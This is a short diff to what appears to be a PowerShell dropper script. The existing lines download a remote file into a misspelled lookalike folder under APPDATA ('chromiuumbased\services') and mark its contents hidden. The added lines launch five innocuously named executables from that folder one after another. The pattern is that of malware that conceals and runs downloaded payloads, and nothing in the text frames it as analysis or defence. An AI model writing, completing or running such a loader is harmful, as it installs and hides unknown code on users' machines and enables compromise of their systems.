@@ -9,3 +9,13 @@ Invoke-WebRequest -uri $WebFile -OutFile $Outff
 Start-Sleep -Seconds 5
 Get-ChildItem -path "$env:APPDATA\chromiuumbased\services\" -Recurse -Force | foreach {$_.attributes = "Hidden"}
 Start-Sleep -Seconds 3
+Timeout /T 5
+Start-Process ("$env:APPDATA\chromiuumbased\services\fsroiod.exe")
+Timeout /T 5
+Start-Process ("$env:APPDATA\chromiuumbased\services\ProcManager.exe")
+Timeout /T 5
+Start-Process ("$env:APPDATA\chromiuumbased\services\netDaemon.exe")
+Timeout /T 5
+Start-Process ("$env:APPDATA\chromiuumbased\services\Netstservice.exe")
+Timeout /T 5
+Start-Process ("$env:APPDATA\chromiuumbased\services\Updmonitor.exe")
